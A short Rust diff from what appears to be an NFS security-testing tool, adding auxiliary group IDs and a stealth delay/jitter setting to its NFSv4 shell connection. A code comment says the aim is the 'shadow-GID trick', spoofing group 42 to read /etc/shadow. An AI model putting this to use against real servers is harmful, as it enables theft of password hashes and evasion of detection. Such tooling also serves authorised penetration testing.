@@ -217,8 +217,13 @@ async fn run_nfs4_shell(args: ShellArgs, globals: &GlobalOpts) -> anyhow::Result
     let mut gid = args.gid.unwrap_or(globals.gid);
     let mut hostname = globals.hostname.clone();
 
+    // Send the primary GID plus any --aux-gids (RFC 5531 S14, up to 16) so the
+    // shadow-GID trick (e.g. GID 42 to read /etc/shadow) works in v4 mode just as
+    // it does in the v3 shell. The client retains the aux GIDs, so a later
+    // `uid`/`gid`/`hostname` change (dispatch_nfs4) re-applies them on reconnect.
     eprintln!("{}", crate::output::status_info(&format!("Connecting to {host}:{nfs_port} via NFSv4 (no MOUNT)")));
-    let mut client = Nfs4DirectClient::connect_with_auth_proxy(addr, uid, gid, &hostname, globals.proxy.as_deref()).await.map_err(|e| anyhow::anyhow!("NFSv4 connect to {addr} failed: {e}"))?;
+    let stealth = StealthConfig::new(globals.delay, globals.jitter);
+    let mut client = Nfs4DirectClient::connect_with_groups_proxy(addr, uid, gid, &globals.aux_gids, &hostname, globals.proxy.as_deref()).await.map_err(|e| anyhow::anyhow!("NFSv4 connect to {addr} failed: {e}"))?.with_stealth(stealth);
 
     // Fetch the root FH from PUTROOTFH + GETFH.
     let root_fh = client.get_root_fh().await.map_err(|e| anyhow::anyhow!("PUTROOTFH failed: {e}"))?;
